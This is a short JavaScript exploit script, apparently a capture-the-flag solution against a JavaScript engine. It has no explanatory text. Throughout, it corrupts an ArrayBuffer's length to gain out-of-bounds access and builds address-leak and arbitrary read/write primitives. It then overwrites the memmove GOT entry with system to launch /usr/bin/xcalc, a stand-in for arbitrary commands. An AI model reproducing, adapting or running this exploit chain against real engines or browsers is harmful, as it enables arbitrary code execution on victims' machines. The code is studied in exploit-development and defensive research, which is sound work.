let buf = new ArrayBuffer(8);
let f64 = new Float64Array(buf);
let i64 = new BigUint64Array(buf);

const ftoi = x => {
  f64[0] = x;
  return i64[0];
};

const itof = x => {
  i64[0] = x;
  return f64[0];
};

let oob = new ArrayBuffer(1);

let egg = new Array(itof(0xdeadbeefn), 2.2, 3.3);
let rdw = new BigUint64Array(1);
let obj = new Array({a: 1}, {b: 2}, {c: 3});

gc();

oob.byteLength = 0xffff;
let view = new DataView(oob);

for (var offset = 0; offset < 0xffff; offset++) {
  if (view.getUint32(offset, true) == 0xdeadbeef) break;  
}

rdw_elem = offset + 0x60;
obj_elem = offset + 0x98;

const addrof = x => {
  let tmp = view.getBigUint64(rdw_elem, true);
  let ptr = view.getBigUint64(obj_elem, true);
  view.setBigUint64(rdw_elem, ptr, true);

  obj[0] = x;
  ret = rdw[0] & 0xffffffffffffn;

  view.setBigUint64(rdw_elem, tmp, true);
  return ret;
};

const read = p => {
  let tmp = view.getBigUint64(rdw_elem, true);
  view.setBigUint64(rdw_elem, p, true);

  let ret = rdw[0];
  view.setBigUint64(rdw_elem, tmp, true);
  return ret;
};

const write = (p, x) => {
  let tmp = view.getBigUint64(rdw_elem, true);
  view.setBigUint64(rdw_elem, p, true);

  rdw[0] = x;
  view.setBigUint64(rdw_elem, tmp, true);
};

let elf = read(addrof(oob) + 8n) - 0x245ea8n;

let got = {
  memmove: elf + 0x23d7650n,
  system:  elf + 0x23d73e0n
};

let system = read(got.system);
write(got.memmove, system);

let pwn = new Uint8Array(32);
let cmd = '/usr/bin/xcalc';

for (let i = 0; i < cmd.length; i++)
  pwn[i] = cmd.charCodeAt(i);

pwn.copyWithin(0, 16);
